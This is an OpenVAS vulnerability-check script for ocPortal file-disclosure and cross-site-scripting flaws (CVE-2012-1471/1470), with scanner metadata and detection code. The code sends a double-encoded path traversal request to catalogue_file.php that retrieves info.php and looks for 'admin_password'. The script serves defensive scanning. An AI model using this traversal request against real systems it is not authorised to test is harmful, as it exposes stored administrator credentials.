###############################################################################
# OpenVAS Vulnerability Test
#
# ocPortal Arbitrary File Disclosure and Cross Site Scripting Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103459");
  script_bugtraq_id(52768);
  script_cve_id("CVE-2012-1471", "CVE-2012-1470");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("ocPortal Arbitrary File Disclosure and Cross Site Scripting Vulnerabilities");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52768");
  script_xref(name:"URL", value:"http://ocportal.com/site/news/view/new-releases/ocportal-7-1-6-released.htm?filter=1%2C2%2C3%2C29%2C30");
  script_xref(name:"URL", value:"http://ocportal.com/start.htm");
  script_xref(name:"URL", value:"http://ocportal.com/site/news/view/ocportal-security-update.htm");
  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23078");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2012-04-03 14:06:27 +0200 (Tue, 03 Apr 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Updates are available. Please see the references for details.");

  script_tag(name:"summary", value:"ocPortal is prone to multiple cross-site scripting vulnerabilities and
an arbitrary file-disclosure vulnerability because the application
fails to sufficiently sanitize user-supplied data.");

  script_tag(name:"impact", value:"An attacker may leverage these issues to execute arbitrary script code
in the browser of an unsuspecting user in the context of the affected
site, steal cookie-based authentication credentials, and obtain
sensitive information.");

  script_tag(name:"affected", value:"ocPortal versions prior to 7.1.6 are vulnerable.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_php( port:port ) ) exit( 0 );

foreach dir( make_list_unique( "/ocportal", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/index.php";
  buf = http_get_cache( item:url, port:port );

  if( "Powered by ocPortal" >< buf ) {
    url = dir + "/site/catalogue_file.php?original_filename=1.txt&file=%252e%252e%252f%252e%252e%252finfo.php";
    if( http_vuln_check( port:port, url:url, pattern:"admin_password" ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
